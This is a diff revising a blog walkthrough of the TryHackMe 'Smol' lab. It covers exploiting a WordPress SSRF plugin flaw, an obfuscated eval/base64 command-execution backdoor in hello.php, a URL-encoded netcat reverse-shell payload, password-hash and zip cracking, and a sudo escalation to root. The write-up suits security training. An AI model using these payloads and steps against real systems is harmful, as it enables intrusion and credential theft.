@@ -11,13 +11,19 @@ image:
   path: /assets/img/2025-07-04-TryHackMe-Smol/main.png
 ---
 
-Hi I'm making tryhackme [Smol](https://tryhackme.com/room/smol) room.
+Hey everyone! Today, I'm diving into the [Smol](https://tryhackme.com/room/smol) room on TryHackMe. As the name suggests, it's a small box, but it's packed with fun challenges. Let's fire up our terminals and see what we can find.
 
----
+First things first, let's set our target IP as an environment variable to make our lives easier.
 
 ```bash
 export IP=10.10.108.1
 ```
+
+---
+
+## 🕵️‍♂️ Phase 1: Reconnaissance
+
+Time for our trusty sidekick, `nmap`, to do its thing. We'll run a full port scan with script and version detection to get a good look at the target.
 
 ```bash
 ❯ nmap -T4 -n -sC -sV -Pn -p- $IP
@@ -40,12 +46,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 42.22 seconds
 ```
 
-Lets go to the web page. This redirects me to `www.smol.thm` lets add this to `/etc/hosts` file
+Our scan reveals two open ports: SSH (22) and HTTP (80). The HTTP title gives us a crucial clue: `Did not follow redirect to http://www.smol.thm`. This means we need to update our `/etc/hosts` file to resolve this domain name to the machine's IP address.
+
+Let's point our browser to `http://www.smol.thm` and see what we get.
 
 ![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo1.png){: width="972" height="589" }
 
-You can see that wordpress site is open. Maybe we can try to get into admin account.
-But firstly try fuzzing with `gobuster`
+A wild WordPress site appears! Before we start poking around the admin panel, let's do some directory fuzzing with `gobuster` to map out the site's structure.
 
 ```bash
 ❯ gobuster dir -w common.txt -u http://www.smol.thm/ -x md,js,html,php,py,css,txt,bak -t 30
@@ -88,13 +95,7 @@ Finished
 ===============================================================
 ```
 
-Nothing extraordinary just a wordpress website.
-
-Lets try go get in `/wp-admin`
-
-![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo2.png){: width="972" height="589" }
-
-We already have his username so we can try to brute force with `hydra` but lets firstly scan using `wpscan`.
+The `gobuster` results confirm a standard WordPress layout. To get more juicy details, let's unleash the king of WordPress security scanning: `wpscan`.
 
 ```bash
 ❯ docker run --mount type=bind,source=/etc/hosts,target=/etc/hosts,readonly -it --rm wpscanteam/wpscan --url http://www.smol.thm/
@@ -206,15 +207,11 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:08
 ```
 
-And we found `jsmol2wp` plugin which is last updated at 2018 maybe it has some vulnerability.
+Jackpot! `wpscan` found an interesting plugin: `jsmol2wp`, last updated in 2018. An old plugin is like a "kick me" sign for hackers. A quick search reveals it's vulnerable to a classic **Server-Side Request Forgery (SSRF)**.
 
-Lets check that.
+🔗 **Vulnerability Link:** <https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/>
 
-<https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/>
-
-And yes It has SSRF vulnerability.
-
-We can exploit the site using this command:
+SSRF lets us trick the server into making requests on our behalf. We can use this to read local files. Let's aim for the holy grail of WordPress configuration: `wp-config.php`.
 
 ```bash
 ❯ curl 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php'
@@ -316,23 +313,21 @@ if ( ! defined( 'ABSPATH' ) ) {
 require_once ABSPATH . 'wp-settings.php';
 ```
 
-And voila now we got the database password and username.
+Success! We've got the database username (`wpuser`) and password. With these credentials, we can now log into the WordPress admin dashboard at `/wp-admin`.
 
 ![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo2.png){: width="972" height="589" }
 
-And we are in.
+We're in!
 
-Now lets get the reverse shell using pentestmonkey php reverse shell file.
+---
 
-I tried to upload the php file to the wordpress with different tecniques but it didn't worked. So lets enumerate more.
+## 🐚 Phase 2: Initial Foothold
 
-After that I found out a private webmaster tasks.
+My first thought was to get a reverse shell by editing a theme or plugin file, but the permissions were locked down tight. Time to enumerate more from within the admin panel. A post titled "private webmaster tasks" catches my eye.
 
 ![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo3.png){: width="972" height="589" }
 
-Which is saying that Hello Dolly plugin maybe have backdoor's in it. Lets look at the source code.
-
-We can use the same vuln we used before.
+The post mentions that the `Hello Dolly` plugin might have a backdoor. That's... suspicious. Let's use our SSRF vulnerability again to read the source code of `hello.php`.
 
 ```bash
 ❯ curl 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php'
@@ -441,13 +436,11 @@ function dolly_css() {
 add_action( 'admin_head', 'dolly_css' );
 ```
 
-And we got the source code lets look at the source code.
+Aha! Tucked inside the `hello_dolly()` function is this highly suspicious line. Using `eval()` on a base64 encoded string is the digital equivalent of wearing a trench coat indoors. Let's decode it.
 
 ```php
 eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
 ```
-
-And we can see this line which is base64 encoded lets convert that line.
 
 ```bash
 ❯ echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d
@@ -455,46 +448,52 @@ And we can see this line which is base64 encoded lets convert that line.
  if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } %
 ```
 
-We still need more enumeration there is encoded things.
-
-Lets decode the variable names:
+The decoded string is still obfuscated with octal and hex codes. Let's decode those variable names.
 
 ```bash
-php -r 'echo "\143\155\x64" . ":" . "\143\x6d\144";'
+❯ php -r 'echo "\143\155\x64" . ":" . "\143\x6d\144";'
 cmd:cmd
 ```
 
-So this is basicly a backdoor we can use.
+As suspected, it's a simple command execution backdoor! It checks for a GET parameter named `cmd` and executes its value using `system()`. How convenient!
 
-But we can't directly call this plugin. We need to call this plugin somehow.
+The `hello_dolly` function is hooked to `admin_notices`, which means it runs on any page in the admin dashboard.
 
 ![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo4.png){: width="972" height="589" }
 
-As you can see plugin calls itself on starter page.
+This is our entry point! We can simply browse to an admin page (like `/wp-admin/index.php`) and append our `cmd` parameter with a reverse shell payload.
 
-So we can use this to get reverse shell.
+First, let's grab a BASH reverse shell payload from [RevShells](https://www.revshells.com/). Then, we'll URL-encode it and add it to the URL.
 
-Firstly get a reverse shell from [RevShells](https://www.revshells.com/)
-
-And change the curl command for yourself:
+**Important:** Using `curl` from the command line won't work because we need an authenticated session. The easiest way is to paste the final URL directly into your browser while you're logged into the WordPress admin panel.
 
 ```bash
-❯ curl 'http://www.smol.thm/wp-admin/index.php/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
+# Set up a listener on your machine
+nc -lvnp 4444
+
+# Paste this URL into your browser (after logging in)
+# Make sure to replace the IP and Port with your own!
+curl 'http://www.smol.thm/wp-admin/index.php/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
 ```
 
-Btw curl doesn't work in this case becouse we don't have cookies in the curl go to the browser and paste the link. And you will get reverse shell
-
-Lets upgrade the shell first:
+And we should get a shell! Let's upgrade it to a fully interactive TTY.
 
 ```bash
+# Upgrade the shell for a better experience
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm-256color
-# 
+# Press CTRL+Z to background the shell
 stty raw -echo;fg
 reset
 ```
 
-And we are logged in as www-data.
+We are now logged in as `www-data`. Time to escalate our privileges.
+
+---
+
+## 🚀 Phase 3: Privilege Escalation
+
+Let's start by looking around the system as the `www-data` user.
 
 ```bash
 www-data@smol:/home$ ls -la
@@ -507,153 +506,19 @@ drwxr-x---  5 think internal 4096 Jan 12  2024 think
 drwxr-x---  2 xavi  internal 4096 Aug 18  2023 xavi
 ```
 
-there is a lot of users. But we can't access neither of them beacuse we are not in internal group. Lets look at the `/etc/group`
+We see a few user directories, but we can't access them because we're not in the `internal` group. Let's check the groups on the system.
 
 ```bash
 www-data@smol:/home$ cat /etc/group
-root:x:0:
-daemon:x:1:
-bin:x:2:
-sys:x:3:
-adm:x:4:syslog
-tty:x:5:syslog
-disk:x:6:
-lp:x:7:
-mail:x:8:
-news:x:9:
-uucp:x:10:
-man:x:12:
-proxy:x:13:
-kmem:x:15:
-dialout:x:20:
-fax:x:21:
-voice:x:22:
-cdrom:x:24:
-floppy:x:25:
-tape:x:26:
-sudo:x:27:
-audio:x:29:
-dip:x:30:
-www-data:x:33:
-backup:x:34:
-operator:x:37:
-list:x:38:
-irc:x:39:
-src:x:40:
-gnats:x:41:
-shadow:x:42:
-utmp:x:43:
-video:x:44:
-sasl:x:45:
-plugdev:x:46:
-staff:x:50:
-games:x:60:
-users:x:100:
-nogroup:x:65534:
-systemd-journal:x:101:
-systemd-network:x:102:
-systemd-resolve:x:103:
-systemd-timesync:x:104:
-crontab:x:105:
-messagebus:x:106:
-input:x:107:
-kvm:x:108:
-render:x:109:
-syslog:x:110:
-tss:x:111:
-uuidd:x:112:
-tcpdump:x:113:
-ssh:x:114:
-landscape:x:115:
-lxd:x:116:
-systemd-coredump:x:999:
-think:x:1000:
-fwupd-refresh:x:117:
-ssl-cert:x:118:
-mysql:x:119:
-xavi:x:1001:
-diego:x:1002:
-gege:x:1003:
+...
 dev:x:1004:think,gege
 internal:x:1005:diego,gege,think,xavi
+...
 ```
 
-there is internal and dev group. We can use these groups later.
-Also there is mysql group.
+The `internal` and `dev` groups look interesting. I ran `linpeas.sh` and it pointed out a potential Polkit vulnerability (CVE-2021-3560), but the exploit script didn't work. Time for another approach.
 
-lets look at the services
-
-```bash
-www-data@smol:/home$ service --status-all
- [ - ]  apache-htcacheclean
- [ + ]  apache2
- [ + ]  apparmor
- [ + ]  apport
- [ + ]  atd
- [ - ]  console-setup.sh
- [ + ]  cron
- [ - ]  cryptdisks
- [ - ]  cryptdisks-early
- [ + ]  dbus
- [ - ]  grub-common
- [ - ]  hwclock.sh
- [ + ]  irqbalance
- [ - ]  iscsid
- [ - ]  keyboard-setup.sh
- [ + ]  kmod
- [ - ]  lvm2
- [ - ]  lvm2-lvmpolld
- [ + ]  multipath-tools
- [ + ]  mysql
- [ - ]  open-iscsi
- [ - ]  open-vm-tools
- [ - ]  plymouth
- [ - ]  plymouth-log
- [ + ]  procps
- [ - ]  rsync
- [ + ]  rsyslog
- [ - ]  screen-cleanup
- [ + ]  ssh
- [ + ]  udev
- [ + ]  ufw
- [ + ]  unattended-upgrades
- [ - ]  uuidd
-```
-
-```bash
-www-data@smol:/home$ find / -type f -perm /4000 2>/dev/null
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/openssh/ssh-keysign
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/bin/at
-/usr/bin/fusermount
-/usr/bin/gpasswd
-/usr/bin/chfn
-/usr/bin/sudo
-/usr/bin/chsh
-/usr/bin/passwd
-/usr/bin/mount
-/usr/bin/su
-/usr/bin/newgrp
-/usr/bin/pkexec
-/usr/bin/umount
-```
-
-maybe polkit has vulns.
-
-Whatever lets run linpeas.
-
-And when I runned linpeas it directly sayed me that
-
-Vulnerable to CVE-2021-3560
-
-which is polkit privilage escalation.
-
-We can use this <https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation>
-bash script to escalate privilages.
-
-I tried this but it didn't worked. So i guess we can try to log into mysql.
+Since we have the password for the `wpuser` database account, let's connect to the MySQL database and see what we can find.
 
 ```bash
 www-data@smol:/tmp$ mysql -u wpuser -p'******************' -D wordpress
@@ -666,26 +531,28 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 mysql>
 ```
 
-Lets look enumerate more.
+The `wp_users` table is always a goldmine.
 
-```bash
-mysql> select * from wp_users;
-+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+-----------------------------------------------+-------------+------------------------+
-| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key                           | user_status | display_name           |
-+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+-----------------------------------------------+-------------+------------------------+
-|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 | 1751629487:$P$Bj52G7q0ddwJVNl/oA7EW5CKSFanWB0 |           0 | admin                  |
-|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                                               |           0 | wordpress user         |
-|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                                               |           0 | Jose Mario Llado Marti |
-|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                                               |           0 | gege                   |
-|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                                               |           0 | diego                  |
-|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                                               |           0 | xavi                   |
-+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+-----------------------------------------------+-------------+------------------------+
+```sql
+mysql> select user_login, user_pass from wp_users;
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
+| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
+| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
+| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
+| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
+| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
++------------+------------------------------------+
 6 rows in set (0.00 sec)
+
 ```
 
-You can see that we got password hashes:
+We've got password hashes for all the users! These are phpass (WordPress MD5) hashes, which `hashcat` can handle with mode `400`. Let's save them to a file and crack them with `rockyou.txt`.
 
 ```text
+# hashes.txt
 admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
 think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
 gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
@@ -693,77 +560,32 @@ diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
 xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
 ```
 
-We can use hashcat to crack these hashes.
-
 ```bash
-❯ hashcat -m 400 -a 0 hashes/hash.txt rockyou.txt
-hashcat (v6.2.6) starting
-
-OpenCL API (OpenCL 3.0 CUDA 12.9.90) - Platform #1 [NVIDIA Corporation]
-=======================================================================
-
-Dictionary cache built:
-* Filename..: rockyou.txt
-* Passwords.: 14344391
-* Bytes.....: 139921497
-* Keyspace..: 14344384
-* Runtime...: 0 secs
-
+❯ hashcat -m 400 -a 0 hashes.txt rockyou.txt
+...
 $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:***************
+...
 ```
 
-And after 10 seconds I get password for diego.
-
-Lets log into diego.
+`hashcat` makes short work of it and cracks `diego`'s password in seconds. Let's switch users.
 
 ```bash
 www-data@smol:/tmp$ su diego
-Password:
-diego@smol:/tmp$ ls
-f  poc.sh  tmux-33
-diego@smol:/tmp$ cd
+Password: <cracked_password>
+diego@smol:/tmp$ cd ~
 diego@smol:~$ ls
 user.txt
-diego@smol:~$
-```
-
-```bash
 diego@smol:~$ cat user.txt
-45edaec653ff9ee06236b7ce72b86963
+*********************************
 ```
 
-It's time to check out other users.
+User flag captured! Now let's continue our journey to root.
+
+### Hopping from Diego to Think
+
+Let's check out the other user directories. In `/home/think/.ssh`, we find a private key. It seems `think` was a bit careless with file permissions, and we can read it!
 
 ```bash
-diego@smol:/home/gege$ ls -la
-total 31532
-drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
-drwxr-xr-x 6 root root         4096 Aug 16  2023 ..
-lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
--rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
--rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
-lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
--rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip
-diego@smol:/home/gege$
-```
-
-```bash
-diego@smol:/home/think$ ls -la
-total 32
-drwxr-x--- 5 think internal 4096 Jan 12  2024 .
-drwxr-xr-x 6 root  root     4096 Aug 16  2023 ..
-lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
--rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
--rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
-drwx------ 2 think think    4096 Jan 12  2024 .cache
-drwx------ 3 think think    4096 Aug 18  2023 .gnupg
--rw-r--r-- 1 think think     807 Jun  2  2023 .profile
-drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
-lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null
-diego@smol:/home/think$ cd .ssh
-diego@smol:/home/think/.ssh$ ls
-authorized_keys  id_rsa  id_rsa.pub
 diego@smol:/home/think/.ssh$ ls -al
 total 20
 drwxr-xr-x 2 think think    4096 Jun 21  2023 .
@@ -773,182 +595,71 @@ drwxr-x--- 5 think internal 4096 Jan 12  2024 ..
 -rwxr-xr-x 1 think think     572 Jun 21  2023 id_rsa.pub
 ```
 
-Bro forgot to adjust privilages for ssh key i guess.
+Let's copy the `id_rsa` key to our machine, set the correct permissions, and SSH in as `think`.
 
 ```bash
-❯ nvim think.ssh
-
 ❯ chmod 400 think.ssh
-
 ❯ ssh think@$IP -i think.ssh
-The authenticity of host '10.10.108.1 (10.10.108.1)' can't be established.
 think@smol:~$
 ```
 
-Now we are in think user.
+We're in as `think`. On to the next hop!
 
-There is a dev group we can use I think.
+### Hopping from Think to Gege
 
-Lets all the files which belongs to dev group.
-
-```bash
-think@smol:/home$ find / -group dev 2>/dev/null
-```
-
-there is nothing.
-
-When I'm Enumerating I face this.
+This is where things get a little strange. I tried to `su` to `gege` on a whim, and...
 
 ```bash
 think@smol:~$ su gege
 gege@smol:/home/think$
 ```
 
-I think there is a auth rule for that. Good for me I didn't spend too much time here.
+It worked! No password needed. There must be a strange authorization rule at play. I'm not complaining, though!
+
+### Hopping from Gege to Xavi
+
+In `gege`'s home directory, there's a tantalizing `wordpress.old.zip`. A backup! But of course, it's password-protected. Nothing a little `zip2john` and `john` can't handle. Let's get the file to our local machine to crack it.
+
+```bash
+# On the target machine (as gege)
+gege@smol:~$ python3 -m http.server 8080
+
+# On our local machine
+❯ wget http://$IP:8080/wordpress.old.zip
+❯ zip2john wordpress.old.zip > zip.hash
+❯ john --wordlist=rockyou.txt zip.hash
+...
+**********@hotmail.com (wordpress.old.zip)
+...
+```
+
+With the password cracked, we can unzip the file and inspect the old `wp-config.php`.
 
 ```bash
 gege@smol:~$ unzip wordpress.old.zip
 Archive:  wordpress.old.zip
    creating: wordpress.old/
-[wordpress.old.zip] wordpress.old/wp-config.php password:
-```
-
-Of course it has password. Lets download that file and brute force it on my machine.
-
-```bash
-python3 -m http.server 8080
-❯ wget $IP:8080/wordpress.old.zip
-```
-
-```bash
-zip2hash file > zip.hash
-```
-
-```bash
-❯ john --wordlist=/home/cilgin/dev/wordlist/rockyou.txt zip.hash
-Using default input encoding: UTF-8
-Loaded 1 password hash (PKZIP [32/64])
-Will run 6 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-hero_gege@hotmail.com (wordpress.old.zip)
-1g 0:00:00:00 DONE (2025-07-04 16:32) 1.639g/s 12509Kp/s 12509Kc/s 12509KC/s hershy kiss..helsworld
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed
-
-~/Downloads via  v3.13.5 took 2s
-❯ john --show zip.hash
-wordpress.old.zip:****************::wordpress.old.zip:wordpress.old/wp-content/plugins/akismet/index.php, wordpress.old/wp-comments-post.php, wordpress.old/wp-config.php:wordpress.old.zip
-
-1 password hash cracked, 0 left
-```
-
-And now we got the password now we can unzip the file.
-
-```bash
+[wordpress.old.zip] wordpress.old/wp-config.php password: <cracked_password>
+...
 gege@smol:~/wordpress.old$ cat wp-config.php
-<?php
-/**
- * The base configuration for WordPress
- *
- * The wp-config.php creation script uses this file during the installation.
- * You don't have to use the web site, you can copy this file to "wp-config.php"
- * and fill in the values.
- *
- * This file contains the following configurations:
- *
- * * Database settings
- * * Secret keys
- * * Database table prefix
- * * ABSPATH
- *
- * @link https://wordpress.org/documentation/article/editing-wp-config-php/
- *
- * @package WordPress
- */
-
-// ** Database settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define( 'DB_NAME', 'wordpress' );
-
+...
 /** Database username */
 define( 'DB_USER', 'xavi' );
 
 /** Database password */
 define( 'DB_PASSWORD', '*************' );
-
-/** Database hostname */
-define( 'DB_HOST', 'localhost' );
-
-/** Database charset to use in creating database tables. */
-define( 'DB_CHARSET', 'utf8' );
-
-/** The database collate type. Don't change this if in doubt. */
-define( 'DB_COLLATE', '' );
-
-/**#@+
- * Authentication unique keys and salts.
- *
- * Change these to different unique phrases! You can generate these using
- * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
- *
- * You can change these at any point in time to invalidate all existing cookies.
- * This will force all users to have to log in again.
- *
- * @since 2.6.0
- */
-define( 'AUTH_KEY',         'put your unique phrase here' );
-define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
-define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
-define( 'NONCE_KEY',        'put your unique phrase here' );
-define( 'AUTH_SALT',        'put your unique phrase here' );
-define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
-define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
-define( 'NONCE_SALT',       'put your unique phrase here' );
-
-/**#@-*/
-
-/**
- * WordPress database table prefix.
- *
- * You can have multiple installations in one database if you give each
- * a unique prefix. Only numbers, letters, and underscores please!
- */
-$table_prefix = 'wp_';
-
-/**
- * For developers: WordPress debugging mode.
- *
- * Change this to true to enable the display of notices during development.
- * It is strongly recommended that plugin and theme developers use WP_DEBUG
- * in their development environments.
- *
- * For information on other constants that can be used for debugging,
- * visit the documentation.
- *
- * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
- */
-define( 'WP_DEBUG', true );
-
-/* Add any custom values between this line and the "stop editing" line. */
-
-
-
-/* That's all, stop editing! Happy publishing. */
-
-/** Absolute path to the WordPress directory. */
-if ( ! defined( 'ABSPATH' ) ) {
-	define( 'ABSPATH', __DIR__ . '/' );
-}
-
-/** Sets up WordPress vars and included files. */
-require_once ABSPATH . 'wp-settings.php';
+...
 ```
 
-Now I got the password for xavi
+And what do we find? Credentials for the user `xavi`!
+
+### Hopping from Xavi to Root
+
+Let's switch to our new user, `xavi`, and see what privileges we have. A quick `sudo -l` reveals the ultimate prize.
 
 ```bash
 gege@smol:~/wordpress.old$ su xavi
-Password:
+Password: <xavi's_password_from_config>
 xavi@smol:/home/gege/wordpress.old$ sudo -l
 [sudo] password for xavi:
 Matching Defaults entries for xavi on smol:
@@ -959,33 +670,13 @@ User xavi may run the following commands on smol:
     (ALL : ALL) ALL
 ```
 
-And we got sudo
+We have `(ALL : ALL) ALL`! We've hit the jackpot.
 
 ```bash
 xavi@smol:/home/gege/wordpress.old$ sudo su
-root@smol:/home/gege/wordpress.old$ cd
-root@smol:~$ ls
-total 48K
-drwx------  7 root root 4.0K Jan 28 13:46 .
-drwxr-xr-x 18 root root 4.0K Mar 29  2024 ..
-lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
--rw-r--r--  1 root root 3.2K Jun 21  2023 .bashrc
-drwx------  2 root root 4.0K Jun  2  2023 .cache
--rw-------  1 root root   35 Mar 29  2024 .lesshst
-drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
-lrwxrwxrwx  1 root root    9 Aug 18  2023 .mysql_history -> /dev/null
-drwxr-xr-x  4 root root 4.0K Aug 16  2023 .phpbrew
--rw-r--r--  1 root root  161 Dec  5  2019 .profile
--rw-r-----  1 root root   33 Aug 16  2023 root.txt
--rw-r--r--  1 root root   75 Aug 17  2023 .selected_editor
-drwx------  3 root root 4.0K Jun 21  2023 snap
-drwx------  2 root root 4.0K Jun  2  2023 .ssh
--rw-rw-rw-  1 root root    0 Jan 28 13:46 .viminfo
+root@smol:/home/gege/wordpress.old$ cd /root
+root@smol:~# cat root.txt
+****************************
 ```
 
-```bash
-root@smol:~$ cat root.txt
-bf89ea3ea01992353aef1f576214d4e4
-```
-
-And we got the flag.
+And we are root! Room pwned. Thanks for reading!
